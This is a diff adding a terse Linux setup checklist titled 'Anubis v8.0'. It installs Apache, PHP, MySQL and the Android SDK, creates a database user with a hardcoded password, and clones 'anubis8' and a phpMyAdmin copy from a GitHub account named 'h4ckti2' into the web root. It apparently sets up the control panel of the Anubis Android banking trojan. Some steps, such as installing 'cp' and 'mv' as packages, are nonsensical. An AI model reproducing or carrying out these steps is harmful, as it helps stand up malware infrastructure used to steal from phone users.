@@ -1,0 +1,66 @@
+Anubis v8.0
+_____________
+
+Commands
+_____________
+su
+cd ~ 
+Pass; Your
+apt update
+apt install sudo
+apt install nano
+apt install node
+apt install npm
+apt install cp
+apt install mv
+apt install android-sdk
+apt install ufw
+apt install python
+apt install wget
+apt install default-jre
+apt install default-jdk
+apt install screen
+apt install software-properties-common
+apt install git
+apt-get install build-essential libxml2-dev checkinstall
+apt-get install -y mysql-server
+service mysql start
+apt-get install apache2
+add-apt-repository ppa:ondrej/php
+apt update
+sudo apt-get install -y php8.0 php8.0-cli php8.0-common php8.0-mysql php8.0-zip php8.0-gd php8.0-mbstring php8.0-curl php8.0-xml php8.0-bcmath php8.0-json
+service apache2 restart
+mysql -u root -p
+password; root
+CREATE USER 'anubis'@'127.0.0.1' IDENTIFIED BY '@34fsedaanubis';
+GRANT ALL PRIVILEGES ON * . * TO 'anubis'@'127.0.0.1';
+FLUSH PRIVILEGES;
+create database anubisdb;
+_______
+
+keybord - Клава
+Ctrl + D
+_________
+git clone https://github.com/h4ckti2/phpmyadmin520
+git clone https://github.com/h4ckti2/anubis8
+mv phpmyadmin520 phpmyadmin
+mv anubis8 site
+mv site /var/www/html
+mv phpmyadmin /var/www/html
+cd /var/www/html/site
+mysql -u anubis -p anubisdb < mysql.sql
+password; @34fsedaanubis
+_______________
+
+UFW; FireWall
+___________
+sudo ufw default deny incoming
+sudo ufw default allow outgoing
+sudo ufw allow OpenSSH
+sudo ufw allow ssh
+sudo ufw allow 22
+sudo ufw allow 80
+sudo ufw allow 443
+sudo ufw allow 21
+sudo ufw allow 5901
+sudo ufw enable
